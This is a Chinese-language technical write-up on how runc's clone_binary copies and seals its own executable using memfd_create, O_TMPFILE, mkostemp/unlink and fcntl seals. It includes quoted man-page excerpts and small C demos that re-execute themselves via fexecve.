一个测试Demo:

```
#define _GNU_SOURCE
#include <sys/mount.h>
#include <time.h>
#include <stdio.h>
#include <sys/types.h>   
#include <sys/stat.h>    
#include <fcntl.h>
#include <stdlib.h>
int main(){
	char template[1024] = "./target.XXXXXX";
	int fd = mkstemp(template);
	printf("%d\n", fd);
	mount("/proc/self/exe", template, "", MS_BIND, "") ;
	mount("", template, "", MS_REMOUNT | MS_BIND | MS_RDONLY, "");
	int ret = open(template, O_PATH | O_CLOEXEC);
	printf("%d\n", ret);
	sleep(20);
	umount2(template, MNT_DETACH);
	printf("umounted\n");
	sleep(1000);
}

/*
$ sudo ./mount_umount_demo 
3
4

$ ls -l
...
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo
-rw-r--r-- 1 invincible invincible  551 Apr 14 20:39 mount_umount_demo.c
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 target.xIAgUt

$ sudo ./mount_umount_demo 
3
4
umounted

$ ls -l
...
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo
-rw-r--r-- 1 invincible invincible  551 Apr 14 20:39 mount_umount_demo.c
-rw------- 1 root       root          0 Apr 14 20:40 target.xIAgUt
invincible@ubuntu:~/Desktop/test/mount_test$ 
*/
```

##### clone_binary->make_execfd
这个方案中make_execfd创建内存文件也有三种方式：

* 通过`memfd_create`
```
#define RUNC_MEMFD_COMMENT "runc_cloned:/proc/self/exe"
#ifndef MFD_CLOEXEC
#  define MFD_CLOEXEC       0x0001U
#  define MFD_ALLOW_SEALING 0x0002U
#endif
static int make_execfd(int *fdtype)
{
	*fdtype = EFD_MEMFD;
	
	fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);
	
	if (fd >= 0)
		return fd;
```
关于`memfd_create`：

```
memfd_create() creates an anonymous file and returns a file
descriptor that refers to it.  The file behaves like a regular file,
and so can be modified, truncated, memory-mapped, and so on.
However, unlike a regular file, it lives in RAM and has a volatile
backing storage.
```
参考： [https://cloud.tencent.com/developer/article/1551288](https://cloud.tencent.com/developer/article/1551288)

* 通过open 设置`O_TMPFILE` flag的方式创建临时文件
```
	*fdtype = EFD_FILE;
	fd = open(prefix, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);
	if (fstat(fd, &statbuf) >= 0)
    working_otmpfile = (statbuf.st_nlink == 0);
	if (working_otmpfile)
	  return fd;
```
关于open函数的`O_TMPFILE`标志：

```
O_TMPFILE (since Linux 3.11)
    Create an unnamed temporary regular file.  The pathname argu‐
    ment specifies a directory; an unnamed inode will be created
    in that directory's filesystem.  Anything written to the
    resulting file will be lost when the last file descriptor is
    closed, unless the file is given a name.
```
* 通过mkostemp+unlink
```
	/*
	 * Our final option is to create a temporary file the old-school way, and
	 * then unlink it so that nothing else sees it by accident.
	 */
	*fdtype = EFD_FILE;
	fd = mkostemp(template, O_CLOEXEC);
	if (fd >= 0) {
		if (unlink(template) >= 0)
			return fd;
```
关于`mkostemp`：简单的创建一个唯一名称的临时文件，并且可以使用`open`函数的部分flag

关于unlink:

```
unlink() deletes a name from the filesystem.  If that name was the
last link to a file and no processes have the file open, the file is
deleted and the space it was using is made available for reuse.
```
##### clone_binary->seal_execfd
* 当`make_execfd`中通过`memfd_create`成功创建了内存文件时

通过`fcntl`为文件添加`seals`，具体是使该内存空间不可扩大和缩小，不可写入，且该限制不可修改：

```
#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001 /* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002 /* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004 /* prevent file from growing */
#  define F_SEAL_WRITE  0x0008 /* prevent writes */
#endif
#define RUNC_MEMFD_SEALS \
	(F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)
static int seal_execfd(int *fd, int fdtype)
{
	switch (fdtype) {
	case EFD_MEMFD:
		return fcntl(*fd, F_ADD_SEALS, RUNC_MEMFD_SEALS);
```


* 如果是通过后两种方式创建的内存文件(`open` 设置`O_TMPFILE`或者`mkostemp+unlink`)

会重新使用`open`设置`O_PATH` flag打开一次，这是为了让`execve`可用。

```
	case EFD_FILE: {
		/* Need to re-open our pseudo-memfd as an O_PATH to avoid execve(2) giving -ETXTBSY. */
		int newfd;
		char fdpath[PATH_MAX] = {0};
		if (fchmod(*fd, 0100) < 0)
			return -1;
		if (snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", *fd) < 0)
			return -1;
		newfd = open(fdpath, O_PATH | O_CLOEXEC);
		if (newfd < 0)
			return -1;
		close(*fd);
		*fd = newfd;
		return 0;
	}
	default:
	   break;
	}
	return -1;
}
```
关于`open` 的`O_PATH` flag：

```
O_PATH (since Linux 2.6.39)
	...
    One use of O_PATH for regular files is to provide the
    equivalent of POSIX.1's O_EXEC functionality.  This permits us
    to open a file for which we have execute permission but not
    read permission, and then execute that file, with steps
    something like the following:
    char buf[PATH_MAX];
    fd = open("some_prog", O_PATH);
    snprintf(buf, PATH_MAX, "/proc/self/fd/%d", fd);
    execl(buf, "some_prog", (char *) NULL);

    An O_PATH file descriptor can also be passed as the argument
    of fexecve(3).
```
demo1:

```
//演示create_memfd + fexecve的方式
// 没有做异常处理
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/sendfile.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#define RUNC_MEMFD_COMMENT "runc_cloned:/proc/self/exe"
#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001	/* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002	/* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004	/* prevent file from growing */
#  define F_SEAL_WRITE  0x0008	/* prevent writes */
#endif
#define RUNC_MEMFD_SEALS \
	(F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)

#ifndef F_LINUX_SPECIFIC_BASE
#  define F_LINUX_SPECIFIC_BASE 1024
#endif
#ifndef F_ADD_SEALS
#  define F_ADD_SEALS (F_LINUX_SPECIFIC_BASE + 9)
#  define F_GET_SEALS (F_LINUX_SPECIFIC_BASE + 10)
#endif

/* Use our own wrapper for memfd_create. */
#if !defined(SYS_memfd_create) && defined(__NR_memfd_create)
#  define SYS_memfd_create __NR_memfd_create
#endif
/* memfd_create(2) flags -- copied from <linux/memfd.h>. */
#ifndef MFD_CLOEXEC
#  define MFD_CLOEXEC       0x0001U
#  define MFD_ALLOW_SEALING 0x0002U
#endif
int memfd_create(const char *name, unsigned int flags)
{
#ifdef SYS_memfd_create
	return syscall(SYS_memfd_create, name, flags);
#else
	errno = ENOSYS;
	return -1;
#endif
}

int main(int argc, char *argv[]){
	if(argc > 1){
		if(strcmp(argv[1], "stage2") == 0){	
			printf("Stage 2 ok\n");
			return 0;
		}
		else{
			return -1;
		}
	}	
	// 通过memfd_create创建内存文件
	int fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);
	printf("%d\n", fd);
	// 把/proc/self/exe 复制到 memfd_create创建的内存文件
	int exefd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	size_t sent = 0;
	struct stat statbuf = {};
	fstat(exefd, &statbuf);
	while (sent < statbuf.st_size) {
		int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);
		sent += n;
	}
	close(exefd);
	printf("sent: %ldbytes\n", sent);
	// 添加seals约束	
	if(fcntl(fd, F_ADD_SEALS, RUNC_MEMFD_SEALS) < 0){
		perror("fcntl error");
	}
	// 执行stage2
	char *env[] = {NULL};
	char *argv2[] = {"", "stage2", NULL};
	fexecve(fd, argv2, env);
	perror("fexecve error");
}
/*
$ gcc memfd_create_demo.c -o memfd
$ ./memfd 
3
sent: 9288bytes
Stage 2 ok
*/
```


demo2:

```
// 演示open O_TEMPFILE + open O_PATH + fexecve的方式
// 没有做异常处理
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
 #include <sys/sendfile.h>
int main(int argc, char *argv[]){
	if(argc > 1){
		if(strcmp(argv[1], "stage2") == 0){	
			printf("Stage 2 ok\n");
			return 0;
		}
		else{
			return -1;
		}
	}
	struct stat statbuf = {};
	size_t sent = 0;
	char **environ;
	char *argv2[] = {"opath", "stage2", NULL};
	int fd = open("./", O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);
	int exefd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	fstat(exefd, &statbuf);
	while (sent < statbuf.st_size) {
		int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);
		sent += n;
	}
	close(exefd);
	fchmod(fd, 0100);
	char fdpath[1024];
	snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
	int newfd = open(fdpath, O_PATH | O_CLOEXEC);
	close(fd);
	fexecve(newfd, argv2, environ);
	// fexecve(fd, argv2, environ);
	perror("fexecve error");
}
/*
$ gcc open_opath_demo.c -o opath
$ ./opath 
Stage 2 ok
*/
```

